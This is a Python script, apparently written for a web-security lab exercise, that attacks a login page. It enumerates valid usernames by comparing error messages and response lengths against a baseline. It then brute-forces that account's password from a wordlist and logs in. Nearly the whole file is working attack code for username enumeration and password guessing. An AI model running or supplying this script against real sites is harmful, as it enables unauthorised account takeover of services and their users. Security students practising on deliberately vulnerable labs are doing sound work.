#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Sun Jul 28 18:56:47 2024

@author: blanco
"""



import requests
import sys
from bs4 import BeautifulSoup

# Target URL
if len(sys.argv) != 2:
    print(f"(+) Usage: {sys.argv[0]} <url>")
    print(f"(+) Example: {sys.argv[0]} www.example.com")
    sys.exit(-1)

url = sys.argv[1]
login_page_url = f"{url}/login"

# Function to extract and compare error messages
def extract_error_message(response_text):
    soup = BeautifulSoup(response_text, 'html.parser')

    # Find and extract the error message or surrounding context
    error_message = soup.find(string="Invalid username or password.")
    
    # Return the exact error message or default text
    if error_message:
        return error_message.strip()  # Ensure trailing spaces are removed
    return soup.get_text()[:500]  # Fallback: Return first 500 chars if not found

# Function to brute-force usernames with response length check
def brute_force_username(base_url, login_url, usernames, static_password):
    print("(+) Scraping baseline response for an invalid login attempt...")
    baseline_response = requests.post(login_url, data={
        'username': 'invalid_user',
        'password': static_password
    })
    
    baseline_message = extract_error_message(baseline_response.text)
    baseline_length = len(baseline_response.text)

    print(f"(+) Baseline error message: '{baseline_message}'")
    print(f"(+) Baseline response length: {baseline_length}")

    # Iterate over the usernames and submit login attempts
    for username in usernames:
        username = username.strip()
        response = requests.post(login_url, data={
            'username': username,
            'password': static_password
        })

        # Extract the current response message and length
        current_message = extract_error_message(response.text)
        current_length = len(response.text)

        print(f"Testing username: {username} | Response length: {current_length}")
        
        # Lab 1: Check for obvious error message difference (e.g., "Incorrect password")
        if "incorrect password" in current_message.lower():
            print(f"Valid username found based on error message: {username}")
            return username

        # Lab 2: Check for subtle differences in response message or length
        elif baseline_message != current_message:
            print(f"Valid username found based on subtle difference: {username}")
            return username
        
        print(f"Tried {username}, not valid.\n")

    return None

# Step 1: Brute-force username enumeration
def find_valid_username():
    # Submit invalid username to check initial response
    response = requests.post(login_page_url, data={
        'username': 'invalid_user',
        'password': 'invalid_password'
    })

    # Open the list of candidate usernames
    with open("users.txt", "r") as user_file:
        usernames = user_file.readlines()

    # Find a valid username
    return brute_force_username(url, login_page_url, usernames, 'invalid_password')

# Function to brute-force password discovery
def brute_force_password(base_url, login_url, username, passwords):
    for password in passwords:
        password = password.strip()
        response = requests.post(login_url, data={
            'username': username,
            'password': password
        })

        # Check for a 302 redirect, which indicates a successful login
        if response.status_code == 302:
            print(f"Valid password found: {password}")
            return password
        else:
            print(f"Tried {password}, not valid.\n")

    return None

# Step 2: Brute-force password discovery
def find_valid_password(username):
    # Open the list of candidate passwords
    with open("pass.txt", "r") as pass_file:
        passwords = pass_file.readlines()

    # Find the valid password
    return brute_force_password(url, login_page_url, username, passwords)

# Main script execution
valid_username = find_valid_username()

if not valid_username:
    print("No valid username found.")
    sys.exit(-1)

# Proceed to brute-force password for the valid username
valid_password = find_valid_password(valid_username)

if not valid_password:
    print("No valid password found.")
    sys.exit(-1)

# Attempt login with valid credentials
session = requests.Session()
login_response = session.post(login_page_url, data={
    'username': valid_username,
    'password': valid_password
})

if login_response.status_code == 200:
    print(f"Successfully logged in as {valid_username}.")
else:
    print("Login failed.")
